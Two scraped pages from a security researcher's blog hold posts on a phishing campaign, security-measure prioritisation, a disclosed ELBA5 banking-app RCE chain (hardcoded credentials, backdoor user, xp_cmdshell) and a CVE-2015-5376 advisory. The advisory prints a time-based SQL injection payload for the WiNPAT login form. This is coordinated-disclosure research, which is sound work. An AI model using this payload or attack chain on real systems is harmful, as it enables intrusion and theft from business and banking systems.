Da leider bereits einige unserer Kunden Opfer der hier beschriebenen Attacke wurden, konnten wir das Vorgehen mehrfach analysieren. Das folgenden Bild illustriert die wichtigsten Abläufe (natürlich anonymisiert):

![](https://bogner.sh/wp-content/uploads/2020/01/IMG_1531.jpg)

Bei allen gekaperten Mailboxen konnten wir nach der initialen Kompromittierung mehrere unautorisierte Zugriffe durch die Angreifer feststellen. U.a. wird dabei auch das IMAP Protokoll eingesetzt. Es ist also davon auszugehen, dass Daten exfiltiert wurden.

Nach Tagen, teilweise sogar Wochen, wird dann das eigene Konto verwendet um selbst Spam Nachrichten an alle Kontakte zu versenden. Dabei wird die versendete Phishing Nachricht auch an den jeweiligen Absender angepasst. Beispielsweise wird die Signatur übernommen und auch der Firmenname in den Phishing Seiten eingebaut. Damit der gerade stattfindenden Spam Versand nicht durch Fehlermeldungen vom Benutzer entlarvt werden kann, werden u.a. Outlook Regeln eingesetzt, die eingehende Nachrichten automatisiert löschen.

All diese Maßnahmen machen die Fake-Mails viel erfolgreicher und erschweren die Erkennung erheblich. Phishing auf den Schultern von Riesen!

Sollten Sie selbst Opfer einer Cyber Attacke geworden sein, stehen wir mit unserem Know How hilfreich zur Seite.

Egal ob Phishing, Cryptolocker oder Datendiebstahl. Wir können helfen: [Bee IT Security](https://www.bee-itsecurity.at)!

![](https://bogner.sh/wp-content/uploads/2018/12/bee_it_security.png)

 Posted by [florian](https://bogner.sh/author/florian/) at 17:25

## [Alternative Methode zur Priorisierung von Informations-Sicherheitsmaßnahmen [German]](https://bogner.sh/2019/04/alternative-methode-zur-priorisierung-von-informations-sicherheitsmasnahmen-german/ "Alternative Methode zur Priorisierung von Informations-Sicherheitsmaßnahmen [German]")

 [Security](https://bogner.sh/category/security/)
 [1 Response »](https://bogner.sh/2019/04/alternative-methode-zur-priorisierung-von-informations-sicherheitsmasnahmen-german/#comments)

Apr 022019

Nachhaltigkeit ist eines der zentralsten Schlagworte in der klassischen IT. Egal ob Server, Storage oder Softwarelizenz, Komponenten sollen einerseits über viele Jahre, mit einem genau bekannten Budget nutzbar und andererseits richtig dimensioniert sein. Nicht zu klein – um frühzeitige Upgrades zu vermeiden – und nicht zu groß – damit es keine ungenutzten Ressourcen gibt.

Laut meinen Beobachtungen trifft diese genaue Planung interessanterweise jedoch nicht immer auf die Entscheidungen zum Thema IT Security zu. Hier werden, „um das eigene Risiko zu senken“, Produkte und Lösungen im fünf und sogar sechsstelligen Bereich ohne zu zögern eingekauft. Obwohl all diese Technologien und Services ihre Berechtigung haben, stellt sich immer die Frage: Ist dieser Schritt der Richtige – **für meinen aktuellen Security Level?** Und die Antwort auf diese Frage ist leider sehr oft: Nein!

Beispielsweise macht es so keinen Sinn über die Anschaffung eines SOC-as-a-Service nachzudenken, solange nicht Basis-Schutzmechanismen wie Festplattenverschlüsselung, Randomisierung der lokalen Admin-Passwörter oder Mail & Webfilter implementiert sind.

Die in diesem Post aufbereiteten Informationen bauen primär auf meine Erfahrungen aus der Tätigkeit bei [Bee IT Security](https://www.bee-itsecurity.at) auf. Unser Ziel ist hier, Unternehmen durch unabhängige Beratung mit solider IT Security auszustatten.

[![](https://bogner.sh/wp-content/uploads/2018/12/bee_it_security.png)](https://www.bee-itsecurity.at)

Gemeinsam mit unserem Partner [nextbeststep](https://www.nextbeststep.at) – dem Spezialisten zum Thema IT Security Awareness in Österreich – wurde nun eine entsprechende Klassifizierung und Bewertung von Maßnahmen für IT Sicherheitsverantwortliche und CISOs erstellt. Danke auch auf diesem Wege noch einmal für die tolle Zusammenarbeit.

![](https://bogner.sh/wp-content/uploads/2019/03/awareness-abo-hero-home.jpg)

Als Ergebnis ist ein Security Katalog mit mehr als 50 Empfehlungen entstanden. All diese wurden zu ihren Kosten, ihrer Durchführungskomplexität und ihrer Wirksamkeit bewertet. **Mit nur einem Blick können Sie so “Quick Wins”für die eigene Infrastruktur identifizieren oder geplante Security Maßnahmen bewerten.** Und das komplett kostenlos.

![](https://bogner.sh/wp-content/uploads/2018/12/screen.png)

Als besonderer Faktor wurde im Übrigen auch die Transparenz für Endbenutzer miteinbezogen. Diese wird leider oft vernachlässigt, ist aber entscheidend für den Erfolg eines jeden IT Security Programms. Werden innerhalb kurzer Zeit zu viele Maßnahmen umgesetzt, die negative Folgen auf den Arbeitsablauf der Mitarbeiter haben, entstehen Spannungen und Frust. Dies kann durch den richtigen “Mix” von vornherein vermieden werden.

Das Excel Dokument können Sie hier herunterladen:

[![](https://bogner.sh/wp-content/uploads/2019/03/Screenshot-2019-03-31-at-11.18.00.png)](https://bogner.sh/wp-content/uploads/2019/04/Priorisierung-von-Info-Sec-Ma%C3%9Fnahmen-v1.9.xlsx)

Im Folgenden finden Sie noch zwei Beispiele, wie das Dokument effizient eingesetzt werden kann.

## Erarbeiten eines Maßnahmenplans

Um einen Maßnahmenplan zu erarbeiten eignet sich die Liste besonders gut. Dazu ist es nämlich nur notwendig, die Zeilen in aufsteigender Reihenfolge für die Spalte “Differenz Umsetzbarkeit – Wirksamkeit (je niedriger umso besser)” zu sortieren. Mit Excel ist das über die Sort Funktion im Ribbon Data einfach möglich.

![](https://bogner.sh/wp-content/uploads/2018/12/Screenshot-2018-12-31-at-14.57.46.png)

Je weiter oben eine Maßnahme nun gelistet wird, umso besser ist einerseits der Kosten/Nutzen Faktor. Des Weiteren sind auch keine Einschränkungen für Endanwender zu erwarten.

Als eine der wichtigsten Maßnahmen wird nun beispielsweise die “Inventur der von extern erreichbaren Dienste” aufgeführt. Wie in der Spalte “Beschreibung” dokumentiert, sollten regelmäßig die über das Internet erreichbaren Dienste und Anwendungen überprüft werden. Erfahrungsgemäß können vor allem alte bzw. vergessene (Web)-Anwendungen missbraucht werden um Zugriff auf das interne Firmennetzwerk zu erhalten. Dementsprechend müssen diese einerseits erkannt und in weiterer Folge deaktiviert werden.

Es empfiehlt sich also das Excel Dokument mit den bereits in der eigenen Infrastruktur umgesetzten Maßnahmen abzugleichen und fehlende Empfehlungen zeitnah umzusetzen. Sie werden überrascht sein, wie viele davon kostengünstig implementiert werden können!

## Priorisierung von Maßnahmen

Das Dokument bzw. die hinterlegten Formeln, können natürlich auch für die Priorisierung von eigenen Maßnahmen verwendet werden. Dazu können Sie einfach selbst neue Zeile hinzufügen.

Wie der folgende Screenshot zeigt, kann so beispielsweise der Mehrwert für das Unternehmen durch die Anschaffung einer Next Generation Endpoint Lösung gegenüber einer AI basierenden Firewall verglichen werden. Dabei ist klar, dass in diesem Fall der Next Generation Endpoint gewählt werden sollte.

![](https://bogner.sh/wp-content/uploads/2018/12/Screenshot-2018-12-31-at-15.49.00.png)

Wenn Sie das Dokument selbst erweitern, würden wir uns über Zusendung dieser Daten freuen. In regelmäßigen Abständen kann die Maßnahmensammlung so erweitert und wieder der Allgemeinheit bereitgestellt werden.

**Natürlich unterstützen wir als Bee IT Security auch Sie gerne bei der Planung ihrer IT Security Strategie. Mehr dazu unter** [**https://bee-itsecurity.at.**](https://bee-itsecurity.at)

 Posted by [florian](https://bogner.sh/author/florian/) at 04:28

## [0-Day in ELBA5’s Network Installation: Overtaking your company’s bank account](https://bogner.sh/2018/11/0-day-in-elba5s-network-installation-overtaking-your-companys-bank-account/ "0-Day in ELBA5’s Network Installation: Overtaking your company’s bank account")

 [Network](https://bogner.sh/category/network/), [Security](https://bogner.sh/category/security/), [Software](https://bogner.sh/category/software/), [Windows](https://bogner.sh/category/windows/)
 [2 Responses »](https://bogner.sh/2018/11/0-day-in-elba5s-network-installation-overtaking-your-companys-bank-account/#comments)

Nov 162018

This blog post is about a previously unknown critical vulnerability in the [Austrian](https://en.wikipedia.org/wiki/Austria) electronic banking application [ELBA5](https://www.elba.at/). The issue discussed here could be abused to gain full control over any ELBA5 database server as well as the underlying operating system. It has a confirmed [CVSSv3 score of 10.0](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H).

**TL;DR: To secure your ELBA5 network installation, please update to the latest available ELBA5 release (5.8.1). For further information please see <https://www.elba.at>**
# What is ELBA5?

ELBA5, as shown below, is one of Austria’s most important business-focused electronic banking applications. It is used by the finance departments of many large organisations and supports about 24 different [banks.](https://www.elba.at/eBusiness/01_template1/1206507788612244132-1206515595789049657-1206515595789049657-NA-38-NA.html)

[![](https://bogner.sh/wp-content/uploads/2018/11/Screenshot-2018-11-06-at-13.13.13.png)](https://bogner.sh/wp-content/uploads/2018/11/Screenshot-2018-11-06-at-13.13.13.png)

It is important to note that there are two distinct ELBA5 releases, namely: ELBA5 single-seat and ELBA5 multi-user (aka network installation). The vulnerability discussed here is only exploitable for the ELBA5 network installation. However, I have also reported several other, although less critical issues for the single-seat release. So it’s highly recommended to updated to the latest version anyway.

To give you a broad understanding of how the ELBA5 software stack works in a multi-user configuration, I create the following diagram. On the left side there is the ELBA5 server: This machine has two distinct functions: On the one hand it serves the ELBA5 binary application to all clients using a standard Windows file share. On the other hand it provides the ELBA5 backend, which is basically a [SAP SQL Anywhere Database](https://www.sap.com/products/sql-anywhere.html).

The enduser systems simply connect to the mentioned file share and launch the ELBA5 client from there. This makes it easy to update the application, as there is only a single package that is used by everyone. All the data that is viewed, modified or created from within the ELBA5 client is directly stored into the backend database. This is everything you need to know in order to understand the following exploit…

[![](https://bogner.sh/wp-content/uploads/2018/10/Wenn-ein-CVSS-Score-von-10.0-ein-leeres-Bankkonto-bedeuten-kann-v0.5.jpg)](https://bogner.sh/wp-content/uploads/2018/10/Wenn-ein-CVSS-Score-von-10.0-ein-leeres-Bankkonto-bedeuten-kann-v0.5.jpg)

# How everything started

The story of this vulnerability began during a penetration test last year. There I was able to gain access to the finance department’s terminal server. Amongst other’s they also used the ELBA5 network installation for their daily business. As I’m curious by nature I immediately launched all the interesting looking applications. Below is an image illustrating the sequence of things that happened right after. Can you spot the (possible) issue?

[![](https://bogner.sh/wp-content/uploads/2018/10/Slide2.jpeg)](https://bogner.sh/wp-content/uploads/2018/10/Slide2.jpeg)

Well, here is the thing that caused my attention: How is it possible to install automatic updates without any previous authentication? Is the ELBA5 application using hardcoded credentials to connect to the backend service?

# Initial Analysis

With this initial discovery I started to dig a little deeper. As ELBA5 is developed in Java I used the [CRF](http://www.benf.org/other/cfr/) decompiler to learn more about the inner workings of the application. Strangely, I could not really find any code that established the connection with the database backend. At that point I got really interested…

As my first try failed, I switched to a more brute force-like method: As I guessed that the ELBA5 client uses hardcoded credentials, they have to be somewhere in memory. A quick search for strings like user, uid, password, pwd however did not reveal anything interesting. Hence I thought, these credentials may get cleaned up immediately after establishing the initial connection. This is where the brute force part comes into play: I downloaded Microsoft’s [procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) and took memory dumps as fast as I could while launching ELBA5. As shown in the screenshot below, this worked out. I was able to capture the credentials of not one, but two valid backend users. Namely, “connector” and “elba”:

[![](https://bogner.sh/wp-content/uploads/2018/10/Screenshot-2018-10-12-at-10.17.40.png)](https://bogner.sh/wp-content/uploads/2018/10/Screenshot-2018-10-12-at-10.17.40.png)

By setting up a second ELBA5 network installation, I verified that the connector user always uses the same static password, whereas the elba user’s password did not work there. This was a problem as only the elba user holds administrative DBA privileges. Based on what I had learned already I came up with the assumption that there has to be a two step process for authentication:

#

# The 1 Million Dollar Question: How is this working in Detail?

After taking a closer look at the privileges of the “connector” user on my debug machine (where I knew the DBA password), I discovered that this account is only authorised for a single column in a single table. Well, now I knew where the encrypted DBA password was stored. That it is encrypted (or at least obfuscated) was clear after I compared the content of the daten column with my known elba password. They were completely different.

[![](https://bogner.sh/wp-content/uploads/2018/10/Screenshot-2018-10-12-at-10.31.42.png)](https://bogner.sh/wp-content/uploads/2018/10/Screenshot-2018-10-12-at-10.31.42.png)

So, I again had to take a closer look at the source code of the application. Finally, after many hours of debugging I discovered an interesting comment:

[![](https://bogner.sh/wp-content/uploads/2018/10/Screenshot-2018-10-12-at-10.34.55.png)](https://bogner.sh/wp-content/uploads/2018/10/Screenshot-2018-10-12-at-10.34.55.png)

Has the database logic been “outsourced” into a separate library? To get a first glance I extracted all the strings from the systemtools.dll library… Some stood out immediately:

[![](https://bogner.sh/wp-content/uploads/2018/10/Screenshot-2018-10-12-at-10.39.11.png)](https://bogner.sh/wp-content/uploads/2018/10/Screenshot-2018-10-12-at-10.39.11.png)The highlighted SQL commands in the above screenshot are likely used to decrypt the secret elba DBA database password. Presumedly the AES encryption algorithm was used to secure the password. From the static strings alone however, I was not able to exfiltrate the required password. So I had to switch to something more dynamic: [Immunity Debugger](https://www.immunityinc.com/products/debugger/).

After setting an access breakpoint on the memory addresses of the above strings (and a few hours of debugging), I found the following information on the stack. The highlighted part contains the hardcoded key that is used to decrypt the elba user’s password.

[![](https://bogner.sh/wp-content/uploads/2018/10/Untitled.png)](https://bogner.sh/wp-content/uploads/2018/10/Untitled.png)

# Bringing it all together

By combining what I had learned by now, it was possible to reliably gain DBA permissions for every single ELBA5 network installation:

1. Connect to the database with the hardcoded “connector” user and SELECT the AES encrypted DBA’s user password
2. Decrypt the password with the static AES key, as obtained with the help of Immunity Debugger
3. Connect to the database with the user elba and the decrypted password. We now have full control over all information that is stored in the DB.

However, this was where the real fun began…

# Adding a Backdoor User

As I was targeting a banking application I thought it would be great to earn a bit of extra cash. So, what about adding a backdoor user?

After again analysing the source code I found out how the user’s password is stored in the table “BEDIENER”:

[![](https://bogner.sh/wp-content/uploads/2018/10/Screenshot-2018-10-12-at-13.00.34.png)](https://bogner.sh/wp-content/uploads/2018/10/Screenshot-2018-10-12-at-13.00.34.png)

By analysing all the involved methods, I was able to make it more readable as:

[![](https://bogner.sh/wp-content/uploads/2018/11/Screenshot-2018-10-12-at-11.10.551.png)](https://bogner.sh/wp-content/uploads/2018/11/Screenshot-2018-10-12-at-11.10.551.png)

This finally made it possible to remotely add arbitrary users to the ELBA5 installation. Logically with admin permissions:

[![](https://bogner.sh/wp-content/uploads/2018/11/Screenshot-2018-11-06-at-13.25.13.png)](https://bogner.sh/wp-content/uploads/2018/11/Screenshot-2018-11-06-at-13.25.13.png)

*Because everyone wants to have a user called “HACKER” in this electronic backing application – Right?*

# Remote Code Execution

But wait, there is more. Because from a pentester’s point of view we care more about overtaking a server than stealing money…. Luckily there is an old friend in the ELBA5 SQL Anywhere database server that we can use: [xp\_cmdshell](http://dcx.sybase.com/1200/en/dbreference/xp-cmdshell-sysproc.html). This SQL command can be used to run arbitrary applications on the operating system level. What makes this even more interesting was, that the database runs with full SYSTEM level permissions:

[![](https://bogner.sh/wp-content/uploads/2018/10/Screenshot-2018-10-12-at-11.20.19.png)](https://bogner.sh/wp-content/uploads/2018/10/Screenshot-2018-10-12-at-11.20.19.png)

That means, we can also add a new Windows Admin. This give us full control over the affected server. [Mimikatz](https://github.com/gentilkiwi/mimikatz) anyone?

# PoC Exploit

To automate the process discussed in this blog post, I wrote a fully fledge python exploit. It can either be used to add a new ELBA5 user to the database or remotely run a command with SYSTEM permissions on the target system. The only thing that is required is that the ELBA5 SQL Anywhere Database service is running a vulnerable version and is accessible over the network (TCP port 2640).

[![](https://bogner.sh/wp-content/uploads/2018/10/Screenshot-2018-10-12-at-12.16.46.png)](https://bogner.sh/wp-content/uploads/2018/10/Screenshot-2018-10-12-at-12.16.46.png)

You can download the full exploit here:

[![](https://bogner.sh/wp-content/uploads/2018/11/Screenshot-2018-11-06-at-13.34.06.png)](https://bogner.sh/wp-content/uploads/2018/11/elba5_exploit.py_.zip)

# Coordinate Public Disclosure Process

I also want to briefly discuss the coordinated public disclosure process that I went through with the developers of ELBA5. The initial issue was reported last year and triaged within days. As some may have already guessed, this is more an architectural issue and so it required intense rewrites and testing. I was invited twice during this process to discuss the current state. We openly talked about the risks and how they can be mitigated.

I really want to everyone involved for how professionally this matter was resolved. Not many companies take IT security that serious. It really shows how they values their partners and endusers. **THANK YOU!**

# Mitigation

This coordinated process is also important for endusers. Why? Well, because the only thing they have to do is: Please install the lastest ELBA5 5.8.1 release from <https://www.elba.at>. A lot of testing went into making the transition to the new authentication module completely transparent.

# Summary

As I always think it is important to summaries the key aspect, I created the following overview. It gives a great high level introduction into the underlying vulnerability and the suggested solution. This slide is also available in [German](https://bogner.sh/wp-content/uploads/2018/11/ELBA5_RCE_de.png).

[![](https://bogner.sh/wp-content/uploads/2018/11/ELBA5_RCE_en.png)](https://bogner.sh/wp-content/uploads/2018/11/ELBA5_RCE_en.png)

If you have any questions, please contact me directly at florian@bee-itsecurity.at or use the comment form below.

Thanks for reading that far 😉

 Posted by [florian](https://bogner.sh/author/florian/) at 07:01

## [Exploit Development for Dummies [Video]](https://bogner.sh/2018/09/exploit-development-for-dummies-video/ "Exploit Development for Dummies [Video]")

 [Security](https://bogner.sh/category/security/), [Software](https://bogner.sh/category/software/), [Windows](https://bogner.sh/category/windows/)
 [1 Response »](https://bogner.sh/2018/09/exploit-development-for-dummies-video/#comments)

Sep 242018

Have you ever asked yourself how vulnerabilities are discovered and how exploits are written? Well, then this is the perfect video for you. We will start by discussing how so called Fuzzers can be used to find previously unknown bugs in applications. Then we will analyse the generated crash dumps to find out if the underlying issue is exploitable and finally, we will write a fully-fledged exploit.

All this will be demonstrated “live”, based on the example of a well-known application with more than 1 million downloads per month. This is your chance to be part of the disclosure of a previously unknown zero-day vulnerability!

If you have any questions or feedback leave a comment below!

 Posted by [florian](https://bogner.sh/author/florian/) at 06:17

## [Malware Analyse für Anfägner [German only]](https://bogner.sh/2018/09/malware-analyse-fur-anfagner-german-only/ "Malware Analyse für Anfägner [German only]")

 [Network](https://bogner.sh/category/network/), [Security](https://bogner.sh/category/security/)
 [No Responses »](https://bogner.sh/2018/09/malware-analyse-fur-anfagner-german-only/#respond)

Sep 062018

Für die meisten Unternehmen ist es undenkbar selbst “Malware Analyse” zu betreiben. Dennoch reichen oft schon wenige Tricks um relevante Eigenschaften einer Malware (sogenannte [IOCs](https://www.sans.org/reading-room/whitepapers/forensics/ioc-indicators-compromise-malware-forensics-34200)) zu finden. Über diese IP Adressen, Hostnamen, Dateien oder Registry Keys kann anschließend abgeleitet werden, ob und welche Endgeräte im eigenen Netzwerk infiziert wurden.

Im folgenden Video stelle ich einige Methoden und Tools vor, wie auch Sie einfache Analysen selbst vornehmen können und so die Sicherheit in Ihrem Unternehmen mit eigener “Threat Intelligence” erhöhen.

Hier noch eine Liste mit Link zu den im Video genutzten Tools:

* [oledump](https://blog.didierstevens.com/programs/oledump-py/) – Analysiert Office Dateien auf gefährliche Inhalte
* [Process Monitor](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) – Protokolliert die Systemaktivität
* [Process Hacker](https://processhacker.sourceforge.io/) – Task Manager On Steroids
* [Autoruns](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns) – Welche Anwendungen werden beim Systemstart geladen?
* [HashMyFiles](https://www.nirsoft.net/utils/hash_my_files.html) – Berechnet den MD5 und SHA1 Hash für eine Datei

 Posted by [florian](https://bogner.sh/author/florian/) at 18:40

[Older Entries](https://bogner.sh/category/security/page/2/)

### Search

### Pages

* [About Me](https://bogner.sh/about-me/)
  + [Curriculum Vitae](https://bogner.sh/wp-content/uploads/2017/11/Florian-Bogner-CV-20171126-NP.pdf#new_tab)
  + [LinkedIn Profile](https://www.linkedin.com/profile/view?id=368904276#new_tab)
  + [XING Profile](https://www.xing.com/profile/Florian_Bogner9#new_tab)
* [Donate](https://bogner.sh/donate1/)
* [Privacy Policy](https://bogner.sh/privacy-policy/)
* [Projects](https://bogner.sh/projects/)
* [References](https://bogner.sh/references/)
### Categories

* [Hardware](https://bogner.sh/category/hardware/) (4)
* [Linux](https://bogner.sh/category/linux/) (10)
* [Mac OS X](https://bogner.sh/category/mac-os-x/) (41)
* [Network](https://bogner.sh/category/network/) (6)
* [Security](https://bogner.sh/category/security/) (39)
* [Software](https://bogner.sh/category/software/) (34)
* [Tipps](https://bogner.sh/category/tipps/) (60)
* [Tools](https://bogner.sh/category/tools/) (21)
* [UAC Technikum Vienna](https://bogner.sh/category/uac-technikum-vienna/) (2)
* [Uncategorized](https://bogner.sh/category/uncategorized/) (18)
* [Web Security](https://bogner.sh/category/web-security/) (2)
* [Windows](https://bogner.sh/category/windows/) (27)

### Recent Posts

* [G DATA Anti-Virus: Abusing OpenSSL to get local admin](https://bogner.sh/2021/10/g-data-anti-virus-abusing-openssl-to-get-local-admin/)
* [CVE-2021-35523: Local Privilege Escalation in Securepoint SSL VPN Client 2.0.30](https://bogner.sh/2021/06/local-privilege-escalation-in-securepoint-ssl-vpn-client-2-0-30/)
* [TeslaRVNG2 meets HAFNIUM Exchange Exploit](https://bogner.sh/2021/05/teslarvng2-meets-hafnium-exchange-exploit/)
* [Dirty Offline Bulk IP Geolocation](https://bogner.sh/2021/01/dirty-offline-bulk-ip-geolocation/)
* [Egregor Post-Incident Monitor / Protector Script](https://bogner.sh/2020/12/egregor-post-incident-monitor-protector-script/)
### Meta

* [Log in](https://bogner.sh/wp-login.php)
* [Entries feed](https://bogner.sh/feed/)
* [Comments feed](https://bogner.sh/comments/feed/)
* [WordPress.org](https://wordpress.org/)

| © 2012 [bogner.sh](http://bogner.sh) |  | [Suffusion theme by Sayontan Sinha](http://aquoid.com/news/themes/suffusion/) |
| --- | --- | --- |



=== Content from bogner.sh_022c724d_20250126_043630.html ===

## [#bogner.sh](https://bogner.sh)

# [CVE-2015-5376: WiNPAT Portal 3 – Unauthenticated SQL Injection Exploit](https://bogner.sh/2015/09/winpat-portal-3-unauthenticated-sql-injection-exploit/ "CVE-2015-5376: WiNPAT Portal 3 – Unauthenticated SQL Injection Exploit")

 [Security](https://bogner.sh/category/security/)
 [Add comments](#respond)

Sep 142015

In accordance with Google’s responsible disclosure policy I’m releasing the details for CVE-2015-5376 “WiNPAT Portal 3 – Unauthenticated SQL Injection Exploit” 90 days after the initial report to the software manufacturer GSI Office.

**They took the reported vulnerability very seriously and fixed it within days. Furthermore they even audited the rest of the application for possible further technical (with a focus on the [OWASP Top 10](https://www.owasp.org/index.php/Category%3AOWASP_Top_Ten_Project)) and/or logical problems.**

**Congratulations GSI Office, that’s the perfect way to handle a security related bug report. And please keep in mind: Not a single software on this earth is bug free: It really depends on how you handle them!**

```

# Title: WiNPAT Portal 3 - Unauthenticated SQL Injection Exploit
# Date: 8.7.2015
# Exploit Author: Florian Bogner [ mail: florian (at) bogner (at) sh - web: https://bogner.sh ]
# Vendor Homepage: http://www.gsi-office.de/en/products/winpat-portal
# Version: verified for 3.2.0.1001 - 3.6.1.0
# Tested on: IIS7.5 and MS SQL Server
# CVE : CVE-2015-5376

Application Description
==========================================================
WiNPAT Portal is a web based IT-solution for law firms and corporate intellectual property departments in industry and research. Using WiNPAT Portal you gain the ability to handle all tasks in the area of IP management in a timely manner via the internet. With WiNPAT Portal we have created an environment to provide simultaneous access to all database driven applications which you have deployed in your office or department. In interaction with the WiNPAT process oriented workflow management, it automates relevant business processes in a transparent and comfortable way.

Vulnerability Description
==========================================================
This issue affects the login form of GSi Office's WiNPAT Portal 3. Although it has only been verified for version 3.2 to 3.6 it is probably applicable for a wider version range. It is caused by not validating the user's input of the login form's username field and thereby allows an attacker to insert malicious SQL commands. This is a very severe issue as it can be exploited without any prior authentication. Only blind time based attacks are possible.

Exploit
==========================================================
To exploit this issue the HTTP POST parameter LoginControl%24txtUserLogin of the login form has to be modified. An easy way to validate the vulnerability is to use  the following credentials:

------------------------------------------
Username: 1');WAITFOR DELAY '0:0:10'--
Password: [None]
------------------------------------------

If successful, the page load will take about ten seconds. To further exploit this vulnerability it is recommended to use sqlmap (http://sqlmap.org/).

```

 Posted by [florian](https://bogner.sh/author/florian/) at 06:21
### Leave a Reply [Cancel reply](/2015/09/winpat-portal-3-unauthenticated-sql-injection-exploit/#respond)

Your Comment

You may use these HTML tags and attributes: `<a href="" title=""> <abbr title=""> <acronym title=""> <b> <blockquote cite=""> <cite> <code> <del datetime=""> <em> <i> <q cite=""> <s> <strike> <strong>`

Name
 (required)

E-mail
 (required)

URI

 Notify me of followup comments via e-mail. You can also [subscribe](https://bogner.sh/comment-subscriptions/?srp=1876&srk=3b2a5787f990ce082d1e3fca55cfaa47&sra=s&srsrc=f) without commenting.

| [An IPv6 Introduction for Pen Testers // Part 4](https://bogner.sh/2015/07/ipv6-for-pen-testers-part-4/) | [Fixing Unresolved Symbol Errors in Windows Exploits](https://bogner.sh/2016/01/fixing-unresolved-symbol-errors-in-windows-exploits/) |
| --- | --- |

### Search

### Pages

* [About Me](https://bogner.sh/about-me/)
  + [Curriculum Vitae](https://bogner.sh/wp-content/uploads/2017/11/Florian-Bogner-CV-20171126-NP.pdf#new_tab)
  + [LinkedIn Profile](https://www.linkedin.com/profile/view?id=368904276#new_tab)
  + [XING Profile](https://www.xing.com/profile/Florian_Bogner9#new_tab)
* [Donate](https://bogner.sh/donate1/)
* [Privacy Policy](https://bogner.sh/privacy-policy/)
* [Projects](https://bogner.sh/projects/)
* [References](https://bogner.sh/references/)
### Categories

* [Hardware](https://bogner.sh/category/hardware/) (4)
* [Linux](https://bogner.sh/category/linux/) (10)
* [Mac OS X](https://bogner.sh/category/mac-os-x/) (41)
* [Network](https://bogner.sh/category/network/) (6)
* [Security](https://bogner.sh/category/security/) (39)
* [Software](https://bogner.sh/category/software/) (34)
* [Tipps](https://bogner.sh/category/tipps/) (60)
* [Tools](https://bogner.sh/category/tools/) (21)
* [UAC Technikum Vienna](https://bogner.sh/category/uac-technikum-vienna/) (2)
* [Uncategorized](https://bogner.sh/category/uncategorized/) (18)
* [Web Security](https://bogner.sh/category/web-security/) (2)
* [Windows](https://bogner.sh/category/windows/) (27)

### Recent Posts

* [G DATA Anti-Virus: Abusing OpenSSL to get local admin](https://bogner.sh/2021/10/g-data-anti-virus-abusing-openssl-to-get-local-admin/)
* [CVE-2021-35523: Local Privilege Escalation in Securepoint SSL VPN Client 2.0.30](https://bogner.sh/2021/06/local-privilege-escalation-in-securepoint-ssl-vpn-client-2-0-30/)
* [TeslaRVNG2 meets HAFNIUM Exchange Exploit](https://bogner.sh/2021/05/teslarvng2-meets-hafnium-exchange-exploit/)
* [Dirty Offline Bulk IP Geolocation](https://bogner.sh/2021/01/dirty-offline-bulk-ip-geolocation/)
* [Egregor Post-Incident Monitor / Protector Script](https://bogner.sh/2020/12/egregor-post-incident-monitor-protector-script/)
### Meta

* [Log in](https://bogner.sh/wp-login.php)
* [Entries feed](https://bogner.sh/feed/)
* [Comments feed](https://bogner.sh/comments/feed/)
* [WordPress.org](https://wordpress.org/)

| © 2012 [bogner.sh](http://bogner.sh) |  | [Suffusion theme by Sayontan Sinha](http://aquoid.com/news/themes/suffusion/) |
| --- | --- | --- |


